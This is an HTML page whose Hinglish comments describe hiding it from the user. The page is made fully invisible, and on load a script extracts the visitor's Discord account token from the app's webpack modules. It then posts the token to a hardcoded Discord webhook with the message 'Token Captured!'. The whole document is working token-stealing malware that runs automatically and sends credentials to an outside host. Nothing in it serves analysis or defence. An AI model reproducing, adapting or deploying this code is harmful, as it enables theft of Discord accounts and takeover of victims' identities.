<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>...</title>
    <style>
        /* Page ko bilkul invisible bana do taaki user ko pata na chale */
        body { margin: 0; padding: 0; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <script>
        // Tera Webhook URL
        const WEBHOOK = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";

        async function grabToken() {
            try {
                // Check karo ki webpack loaded hai ya nahi
                if (typeof window.webpackChunkdiscord_app === 'undefined') {
                    console.log("Webpack not found. Waiting...");
                    // Agar load nahi hua, toh 2 second wait karo (Discord load hone ka wait)
                    await new Promise(r => setTimeout(r, 2000));
                    
                    // Dobara check karo
                    if (typeof window.webpackChunkdiscord_app === 'undefined') {
                        console.log("Still no context. Sending null.");
                        return;
                    }
                }

                // Tera Original Code (Modified for async/return)
                let token = null;
                try {
                    const chunks = Object.values(window.webpackChunkdiscord_app.push([[Symbol()],{},e=>e.c]));
                    for(let e of chunks) {
                        if(!e.exports || e.exports === window) continue;
                        if(e.exports?.getToken) {
                            token = e.exports.getToken();
                            break;
                        }
                        for(let t in e.exports) {
                            if(e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
                                token = e.exports[t].getToken();
                                break;
                            }
                        }
                        if(token) break;
                    }
                } catch(e) {
                    console.error("Grab error", e);
                }

                if(token) {
                    // Token ko Webhook par bhejo
                    await fetch(WEBHOOK, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            content: `🔓 **Token Captured!**\n\n\`\`\`${token}\`\`\``
                        })
                    });
                    console.log("Token Sent!");
                } else {
                    console.log("Token not found.");
                }

            } catch(e) {
                console.error("Main error", e);
            }
        }

        // Page load hote hi start karo
        grabToken();
    </script>
</body>
</html>
